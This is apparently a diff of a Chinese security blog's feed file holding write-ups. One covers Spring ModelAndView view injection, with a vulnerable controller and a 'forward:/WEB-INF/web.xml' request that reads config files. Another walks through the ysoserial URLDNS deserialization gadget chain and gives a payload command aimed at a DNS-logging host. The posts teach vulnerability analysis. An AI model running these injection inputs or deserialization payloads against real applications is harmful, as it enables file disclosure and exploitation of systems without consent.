-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAndViewTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping</span>(<span class="string">"/menuitem"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">menuitem</span><span class="params">(@RequestParam(value = <span class="string">"url"</span>)</span>String url) </span>&#123;</span><br><span class="line">		String nextUrl = url;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(nextUrl);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>ModelAndView</code>是Spring中的一个模型视图对象，作用是设置跳转的视图地址或把controller方法中处理的数据传到jsp页面。</p>
-<p><code>ModelAndView</code>有两种使用形式：</p>
-<ol>
-<li>forward:/view</li>
-<li>redirect:/view</li>
-</ol>
-<p>若<code>ModelAndView(view)</code>中的<code>view</code>参数可被用户控制，可能导致文件被读取的问题。</p>
-<p>若直接访问 <a href="http://localhost:8089/WEB-INF/web.xml" target="_blank" rel="noopener">http://localhost:8089/WEB-INF/web.xml</a> ，返回404</p>
-<p><img src="/2020/06/13/Spring_ModelAndView_Injection/request_web_xml.png" alt="request_web.xml"></p>
-<p>而使用<code>ModelAndView</code>注入，访问 <a href="http://localhost:8089/menuitem?url=forward:/WEB-INF/web.xml" target="_blank" rel="noopener">http://localhost:8089/menuitem?url=forward:/WEB-INF/web.xml</a> ，就可以看到<code>web.xml</code>的内容</p>
-<p><img src="/2020/06/13/Spring_ModelAndView_Injection/forward_web_xml.png" alt="forward_web.xml"></p>
-<p>但是仅能读取web目录下的文件，不能读取系统其他文件。尝试读取web目录外的文件时产生如下报错：<code>Check that the corresponding file exists within your web application archive!</code></p>
-<p><img src="/2020/06/13/Spring_ModelAndView_Injection/500_error.png" alt="500_error"></p>
-<p>除了文件读取，当然也能进行一些权限认证的绕过，这需要考虑具体的代码场景，不一定通用。</p>
-<p>不过实际项目代码中多了<code>RedirectView()</code>方法变成以下情形：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAndViewTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping</span>(<span class="string">"/menuitem"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">menuitem</span><span class="params">(@RequestParam(value = <span class="string">"url"</span>)</span>String url) </span>&#123;</span><br><span class="line">		String nextUrl = url;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> RedirectView(url));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>RedirectView</code>会触发302跳转的结果，等效于使用<code>url=redirect:/WEB-INF/web.xml</code></p>
-<p><img src="/2020/06/13/Spring_ModelAndView_Injection/redirectview_web_xml.png" alt="redirectview_web.xml"></p>
-<p>虽然存在<code>RedirectView</code>不能直接读取文件，但能利用302跳转这一特性，实现URL重定向</p>
-<p><img src="/2020/06/13/Spring_ModelAndView_Injection/open_redirect.png" alt="open_redirect"></p>
-<p>302跳转处回显了我们的输入，那么能进行CRLF注入吗？</p>
-<p>答案是不能，Spring会将\r\n进行处理，转换成空格。在下图的请求中可以看到<code>%0d</code>和<code>%0a</code>被转换成<code>\x20</code></p>
-<p><img src="/2020/06/13/Spring_ModelAndView_Injection/redirect_crlf.png" alt="CRLF"></p>
-<h1 id="3-分析"><a href="#3-分析" class="headerlink" title="3. 分析"></a>3. 分析</h1><p><code>/spring-framework/spring-webmvc/src/main/java/org/springframework/web/servlet/view/UrlBasedViewResolver.java:468</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> View <span class="title">createView</span><span class="params">(String viewName, Locale locale)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="comment">// If this resolver is not supposed to handle the given view,</span></span><br><span class="line">	<span class="comment">// return null to pass on to the next resolver in the chain.</span></span><br><span class="line">	<span class="keyword">if</span> (!canHandle(viewName, locale)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Check for special "redirect:" prefix.</span></span><br><span class="line">	<span class="keyword">if</span> (viewName.startsWith(REDIRECT_URL_PREFIX)) &#123;</span><br><span class="line">		String redirectUrl = viewName.substring(REDIRECT_URL_PREFIX.length());</span><br><span class="line">		RedirectView view = <span class="keyword">new</span> RedirectView(redirectUrl,</span><br><span class="line">			isRedirectContextRelative(), isRedirectHttp10Compatible());</span><br><span class="line">		String[] hosts = getRedirectHosts();</span><br><span class="line">		<span class="keyword">if</span> (hosts != <span class="keyword">null</span>) &#123;</span><br><span class="line">			view.setHosts(hosts);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> applyLifecycleMethods(REDIRECT_URL_PREFIX, view);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Check for special "forward:" prefix.</span></span><br><span class="line">	<span class="keyword">if</span> (viewName.startsWith(FORWARD_URL_PREFIX)) &#123;</span><br><span class="line">		String forwardUrl = viewName.substring(FORWARD_URL_PREFIX.length());</span><br><span class="line">		InternalResourceView view = <span class="keyword">new</span> InternalResourceView(forwardUrl);</span><br><span class="line">		<span class="keyword">return</span> applyLifecycleMethods(FORWARD_URL_PREFIX, view);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Else fall back to superclass implementation: calling loadView.</span></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">super</span>.createView(viewName, locale);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从代码中可以看到，存在三种<code>viewName</code>的处理方法：</p>
-<ol>
-<li>以<code>redirect:</code>为前缀</li>
-<li>以<code>forward:</code>为前缀</li>
-<li>没有前缀</li>
-</ol>
-<h2 id="3-1-以redirect为前缀"><a href="#3-1-以redirect为前缀" class="headerlink" title="3.1 以redirect为前缀"></a>3.1 以redirect为前缀</h2><p>新建一个<code>RedirectView</code>对象，表现结果是根据视图名进行302跳转，返回包中的<code>Location</code>头为<code>redirectUrl</code>变量。</p>
-<p><img src="/2020/06/13/Spring_ModelAndView_Injection/redirect_web_xml.png" alt="redirect_web.xml"></p>
-<h2 id="3-2-以forward为前缀"><a href="#3-2-以forward为前缀" class="headerlink" title="3.2 以forward为前缀"></a>3.2 以forward为前缀</h2><p>新建一个<code>InternalResourceView</code>对象，根据视图名到指定的位置获取视图模板</p>
-<p>在spring的配置文件中，会存在如下的视图解析器配置</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>InternalResourceView</code>对象会受到该视图解析器配置的影响。</p>
-<p><code>InternalResourceViewResolver</code>会把返回的视图名称都解析为<code>InternalResourceView</code>对象，<code>InternalResourceView</code>会把Controller处理器方法返回的模型属性都存放到对应的<code>request</code>属性中，然后通过<code>RequestDispatcher</code>在服务器端把请求forword重定向到目标URL。比如在<code>InternalResourceViewResolver</code>中定义了<code>prefix=/WEB-INF/</code>，<code>suffix=.jsp</code>，然后请求的Controller处理器方法返回的视图名称为<code>test</code>，那么这个时候<code>InternalResourceViewResolver</code>就会把<code>test</code>解析为一个<code>InternalResourceView</code>对象，先把返回的模型属性都存放到对应的<code>HttpServletRequest</code>属性中，然后利用<code>RequestDispatcher</code>在服务器端把请求forword到<code>/WEB-INF/test.jsp</code>。</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/"</span>/&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>/spring-framework/spring-webmvc/src/main/java/org/springframework/web/servlet/view/UrlBasedViewResolver.java:549</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> AbstractUrlBasedView <span class="title">buildView</span><span class="params">(String viewName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	Class&lt;?&gt; viewClass = getViewClass();</span><br><span class="line">	Assert.state(viewClass != <span class="keyword">null</span>, <span class="string">"No view class"</span>);</span><br><span class="line"></span><br><span class="line">	AbstractUrlBasedView view = (AbstractUrlBasedView) BeanUtils.instantiateClass(viewClass);</span><br><span class="line">	view.setUrl(getPrefix() + viewName + getSuffix());</span><br><span class="line">	view.setAttributesMap(getAttributesMap());</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
-
-<p><code>view.setUrl(getPrefix() + viewName + getSuffix())</code>会将前缀后缀拼接到<code>view</code>中，会导致可访问的文件有限（此时的前缀后缀是配置文件中的<code>prefix</code>和<code>suffix</code>，不是传入时的<code>forward:</code>）。</p>
-<h2 id="3-3-没有前缀"><a href="#3-3-没有前缀" class="headerlink" title="3.3 没有前缀"></a>3.3 没有前缀</h2><p>则调用<code>super.createView()</code>方法，等效于用户直接访问<code>viewName</code>。</p>
-<p><code>/spring-framework/spring-webmvc/src/main/java/org/springframework/web/servlet/view/AbstractCachingViewResolver.java:274</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> View <span class="title">createView</span><span class="params">(String viewName, Locale locale)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> loadView(viewName, locale);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><p><code>Spring ModelView Injection</code>有以下几种利用方式：</p>
-<ol>
-<li>web目录下的文件读取，但存在一定的限制（<code>InternalResourceViewResolver</code>中前后缀的配置）</li>
-<li>权限认证绕过</li>
-<li>重定向</li>
-</ol>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf" target="_blank" rel="noopener">https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf</a></p>
-<p><a href="http://johnis.online/old/2018/09/18/spring-view-injection/" target="_blank" rel="noopener">http://johnis.online/old/2018/09/18/spring-view-injection/</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>Tomcat 8.5版本以上隐藏400报错信息</title>
     <url>/2019/12/26/Tomcat8.5+_400_hide/</url>
     <content><![CDATA[<p>一个平时没注意过的问题。</p>
@@ -1690,6 +1690,145 @@
 <p><img src="/2019/12/26/Tomcat8.5+_400_hide/exec-docker.png" alt="exec-docker"></p>
 <p><code>cd /usr/local/soft/tomcat/</code>就到了tomcat目录，其中<code>conf</code>目录就是配置文件所在的目录，需要更改的<code>server.xml</code>就在该路径下</p>
 <p><img src="/2019/12/26/Tomcat8.5+_400_hide/tomcat-conf-path.png" alt="tomcat-conf-path"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>理解Java反序列化-ysoserial URLDNS</title>
+    <url>/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/</url>
+    <content><![CDATA[<p>目前网上绝大部分 Java 反序列化漏洞文章都以 <code>CommonsCollections</code> 这条利用链作为教程，这条利用链其实特别复杂，用 <code>CommonsCollections</code> 作为 Java 反序列化入门教程未免太过硬核。</p>
+<p>想要利用「不安全的反序列化」漏洞，就需要看被反序列化的类的 <code>readObject()</code> 是怎么写的。通常 Java 反序列化类中的 <code>readObject()</code> 方法很少会被重写，这也就是为什么「不安全的反序列化」利用链一般都只出现在通用 jar 包中。大部分反序列化的利用链较为复杂，甚至还需要多种 Java 特性来配合，比如反射、动态代理、JNDI注入等等，光了解这些特性就要花上不少时间。</p>
+<p>这里通过 URLDNS 作为利用链来学习 Java 反序列化就会简单很多。</p>
+<a id="more"></a>
+
+<h1 id="一、利用"><a href="#一、利用" class="headerlink" title="一、利用"></a>一、利用</h1><p>使用 WebGoat 不安全的反序列化题目作为复现环境。</p>
+<p><code>URLDNS</code> 是 ysoserial 工具的一个模块，作用是发起一个 DNS 请求，该模块方便在于利用广，仅靠 JDK 默认的 <code>java.util.Hashmap</code> 和 <code>java.net.URL</code> 即可完成反序列化的过程。并且利用链较短，有助于理解 Java 反序列化，利用链太长容易迷茫在利用链中的技术细节中。</p>
+<p>ysoserial 中 URLDNS 模块的使用方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;https:&#x2F;&#x2F;dns.example.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Burp Deserialization Scanner Exploiting 利用如下：</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/URLDNS-exploit.png" alt="URLDNS-exploit"></p>
+<p>Burp Collaborator 得到如下返回，就这样非常简单的完成了一次反序列化的利用，利用反序列化发起了一次DNS请求。</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/burp-collaborator-result.png" alt="burp-collaborator-result"></p>
+<h1 id="二、调试前准备"><a href="#二、调试前准备" class="headerlink" title="二、调试前准备"></a>二、调试前准备</h1><p>ysoserial 项目地址： <a href="https://github.com/frohoff/ysoserial/" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/</a> ，git clone 或直接下载下来导入到编译器中，我这里使用的编译器是 IntelliJ IDEA。</p>
+<p>ysoserial 项目结构如下，在 payloads 目录中可以看到 ysoserial 中所有的可利用类。</p>
+<img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/ysoserial-payload.png" alt="ysoserial-payload" style="zoom:40%;">
+
+<p>ysoserial 项目中存在 pom.xml 文件，表明这是一个由 maven 构建的项目。IntelliJ IDEA 会自动根据其中的配置下载依赖。</p>
+<blockquote>
+<p>POM（Project Object Model，即项目对象模型）是 Maven 工程的基本工作单元，是一个 XML 文件，包含了 Maven 用于构建项目的项目信息及各种配置信息，比如项目依赖，项目开发人员，版本，插件，组织信息、项目授权、项目的 url 等等。我们通过 POM 文件来完成对 Maven 项目的管理，构建等操作。</p>
+</blockquote>
+<p>如果 maven 依赖有问题，可以手工点击菜单里的 <code>Files - Project Structure</code>，然后配置 Libraries。</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/ysoserial-project-structure.png" alt="ysoserial-project-structure"></p>
+<p>先输入需导入的包名，等待搜索完成，再选择相应的版本下载即可。</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/download-library-from-maven-repository.png" alt="download-library-from-maven-repository"></p>
+<p>pom.xml 文件中 <code>maven-assembly-plugin</code> 就是一个用来打包项目的插件，可以把依赖、类文件什么的都打包在一起。其中存在 <code>&lt;mainClass&gt;</code>，表明 <code>ysoserial.GeneratePayload</code> 就是主类。</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/maven-mainClass.png" alt="maven-mainClass"></p>
+<p>根据 pom.xml 中的 <code>&lt;mainClass&gt;</code> 找到找到 <code>GeneratePayload</code> 类，<code>main</code> 函数前有个绿色的小箭头，点击这个小箭头可选择从此 Debug（ 因为一个项目中可能存在多个 <code>main</code> 函数，所以通过这种方法快速找到运行时的主类）。</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-GeneratePayload.png" alt="debug-GeneratePayload"></p>
+<p>此时就可以在我们需要的地方下断点，在 IntelliJ IDEA 中点击左侧栏即可设下断点，下图红色圆圈就是断点，调试过程中，程序运行到断点处就会停下。</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/URLDNS-hashmap.png" alt="URLDNS-hashmap"></p>
+<p>如果此时直接开始调试只能在 console 中看到输出 usage 页面，ysoserial 需要添加参数来运行指定的 payloads 模块。</p>
+<p>所以需要修改默认参数。修改路径/方法如下。打开 IDEA 右上角的 <code>Edit Configurations...</code></p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/Edit-Configurations.png" alt="Edit-Configurations"></p>
+<p>然后在 Program arguments 中输入参数 <code>URLDNS &quot;&lt;http://xxx.com&gt;&quot;</code></p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/set-program-arguments.png" alt="set-program-arguments"></p>
+<p>以上方法主要是调试整个程序，调试其他项目的思想大致如此。</p>
+<p><em>ysoserial 可以不用单独调试，这里主要是为了记录方法/思想，以后遇到其他项目时就知道该怎么去调试了。</em></p>
+<h1 id="三、反序列化过程调试"><a href="#三、反序列化过程调试" class="headerlink" title="三、反序列化过程调试"></a>三、反序列化过程调试</h1><h2 id="3-1-介绍"><a href="#3-1-介绍" class="headerlink" title="3.1 介绍"></a>3.1 介绍</h2><p>ysoserial 有那么多 payloads，调试整个程序是非常冗余的。ysoserial 提供了单独调试 payloads 的方法，每个 payload 的 <code>main</code> 方法中都有调用 <code>PayloadRunner</code> ，可以 Debug payload 的 <code>main</code> 函数来进行单独调试。不设置运行参数时会默认使用 <code>calc.exe</code> 作为参数来执行。</p>
+<p>并且 PayloadRunner 会完成序列化到反序列化全部过程，就是从 payload 的生成到 <code>readObject()</code> 的读取。这样无需额外找反序列化环境来测试，方便快捷～</p>
+<p>在 URLDNS 中点击 <code>main</code> 函数左侧的箭头进行 Debug</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-URLDNS-main.png" alt="debug-URLDNS-main"></p>
+<p>单独调试 payload 同样需要添加参数，但无需指定模块，仅设置 DNSlog地址<code>&quot;http://xxx.com&quot;</code> 即可</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/set-program-arguments-URLDNS.png" alt="set-program-arguments-URLDNS"></p>
+<p>URLDNS 中的 <code>getObject()</code> 方法中新建了一个 <code>HashMap</code> 类，并在 <code>HashMap</code> 中放置了一个 <code>java.net.URL</code> 类，url 是我们传入的参数。相比于其他 ysoserial 中的 payload，URLDNS 非常简单明了。</p>
+<p>从中我们可以得知 URLDNS 序列化的是 <code>HashMap</code> 类，在之后反序列化的过程中，就能明确需要追踪的是 <code>HashMap -&gt; readObject()</code></p>
+<h2 id="3-2-反序列化过程"><a href="#3-2-反序列化过程" class="headerlink" title="3.2 反序列化过程"></a>3.2 反序列化过程</h2><p>URLDNS 中 <code>main</code> 函数中用到 <code>PayloadRunner.run（URLDNS.class, args)</code></p>
+<p><code>PayloadRunner</code> 在这里不是重点，就不单独介绍。<code>PayloadRunner</code> 代码分析可参考：<a href="http://1codelife.com/2017/09/17/Java-deserial-learning1/" target="_blank" rel="noopener">http://1codelife.com/2017/09/17/Java-deserial-learning1/</a></p>
+<p><code>final Object objAfter = Deserializer.deserialize(serialized)</code> 表示调用反序列化过程，如下图断点处</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-deserialize.png" alt="debug-deserialize"></p>
+<p><code>Deserializer</code> 类的 <code>deserialize</code> 方法处调用 <code>objIn.readObject()</code>，正式进入反序列化操作</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-objectinputstream-readobject.png" alt="debug-objectinputstream-readobject"></p>
+<p>在反序列化过程前有一些概念需要理解：</p>
+<ol>
+<li>反序列化漏洞应该叫做「不安全的反序列化」漏洞，正常的反序列化是不存在危害的；</li>
+<li>反序列化类必需实现 <code>Serializable</code> 接口，并重写 <code>readObject()</code> 方法；</li>
+<li>未重写 <code>readObject()</code> 不存在「不安全的反序列化」漏洞；</li>
+<li>即使重写 <code>readObject()</code> 也不一定就存在「不安全的反序列化」漏洞，还需要看重写的内容，是否可构造「有效利用链」；</li>
+<li>序列化对象被反序列化时会调用序列化对象的<code>readObject()</code>方法。</li>
+</ol>
+<p>第 5 点可能不太好理解，就以 URLDNS 来举例，上图断点处是 <code>objIn.readObject()</code> ，<code>objIn</code>是<code>ObjectInputStream</code>对象，可以理解为执行的是 <code>ObjectInputStream.readObject()</code> 。此处 <code>readObject()</code> 的作用是读取传入的序列化对象。</p>
+<p>此时我们传入一个 <code>HashMap</code> 的序列化对象，<code>ObjectInputStream.readObjec()</code> 会读取该序列化对象，进行反序列化操作，反序列化过程中会执行序列化对象的 <code>readObject()</code> 方法，也就是执行 <code>HashMap.readObject()</code> 方法。</p>
+<blockquote>
+<p>两个 <code>readObject()</code> 都会执行，但两者的作用不同。利用链开始的 <code>readObject()</code> 是后者。</p>
+</blockquote>
+<p>想要利用「不安全的反序列化」漏洞，就需要看序列化对象的 <code>readObject()</code> 是怎么写的。通常 Java 序列化类中的 <code>readObject()</code> 方法很少会被重写，这也就是为什么「不安全的反序列化」一般都只出现在通用 jar 包中。且每一个反序列化的利用链都非常复杂，甚至还需要多种 Java 特性来配合，比如反射、动态代理、JNDI 注入等等，光了解这些特性就要花上不少时间。</p>
+<p>从 <code>ObjectInputStream.readObject()</code> 到 <code>HashMap.readObject()</code> 过程中会经过多个 <code>java.io</code> 和 <code>sun.reflect</code> 类中方法的调用 ，见下图调用栈，<strong>这是 Java 反序列化中最需要理解的一步</strong>。</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/readobject-stack.png" alt="readobject-stack"></p>
+<p>从此开始反序列化利用链的分析，<code>HashMap -&gt; readObject()</code> 代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">            <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it's the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we're actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[]<span class="class">.<span class="keyword">class</span>, <span class="title">cap</span>)</span>;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>咋一看 <code>readObject()</code> 方法并不会有特别明显的异常，其实重点在最后一行 <code>putVal(hash(key), key, value, false, false)</code>的 <code>hash()</code> 方法，计算 key 的 hash 值（在这下断点会方便后续快速调试）</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-putVal.png" alt="debug-putVal"></p>
+<blockquote>
+<p>使用 IntelliJ IDEA 调试在这里会碰到问题，可能调试不会步进 hash 方法，而是直接步进 putVal 方法中，具体原因可看最下方附录。</p>
+</blockquote>
+<p>步进 <code>hash</code> 方法，看到其中调用了 key 的 <code>hashCode</code> 方法</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-hashCode.png" alt="debug-hashCode"></p>
+<p>继续步进 <code>hashCode</code>，因为 key 是一个 <code>java.net.URL</code> 对象，就会跳到<code>URL -&gt; hashCode</code> 方法</p>
+<p>可以看到这里会判断<code>hashCode != -1</code>，这也是为什么构造 payload 时会将 hashCode 赋值为 -1</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/hashCode-not-equal-minus-one.png" alt="hashCode-not-equal-minus-one"></p>
+<p>此处 <code>handler</code> 是 <code>URLStreamHandler</code> 的一个对象，由 <code>transient URLStreamHandler handler</code> 创建。继续步进 <code>hashCode</code> 方法。</p>
+<p>在 359 行看到 <code>getHostAddress</code>，步进该方法</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-getHostAddress.png" alt="debug-getHostAddress"></p>
+<p>这⾥ <code>InetAddress.getByName(host)</code> 的作⽤是根据主机名，获取其 IP 地址，在⽹络上就是⼀次 DNS 查询。</p>
+<p>其实到这⾥反序列化的调试就可以结束了，后续是具体发起 DNS 查询的步骤。</p>
+<p>我们也可再继续步进</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-InetAddress-getByName.png" alt="debug-InetAddress-getByName"></p>
+<p>中间略过几步…</p>
+<p>直接到关键步骤 <code>nameService.lookupAllHostAddr(host)</code>，正是从此处发起 DNS 查询。</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-InetAddress.getAllByName.png" alt="debug-InetAddress.getAllByName"></p>
+<p>下图是从 <code>HashMap -&gt; readObject()</code> 开始到 DNS 请求执行的调用栈，这是 ysoserial payloads 中最简单的调用栈。</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-URLDNS-stack.png" alt="debug-URLDNS-stack"></p>
+<p>整个 URLDNS 的利用链可以简单概括成：</p>
+<ol>
+<li>HashMap -&gt; readObject()</li>
+<li>HashMap -&gt; hash()</li>
+<li>URL -&gt; hashCode()</li>
+<li>URLStreamHandler -&gt; hashCode()</li>
+<li>URLStreamHandler -&gt; getHostAddress()</li>
+<li>InetAddress -&gt; getByName()</li>
+<li>…</li>
+</ol>
+<h1 id="四、构造利用链"><a href="#四、构造利用链" class="headerlink" title="四、构造利用链"></a>四、构造利用链</h1><p>知道了反序列化的过程，就能据此构造利用链，利用链也叫做 “Gadget chains”。</p>
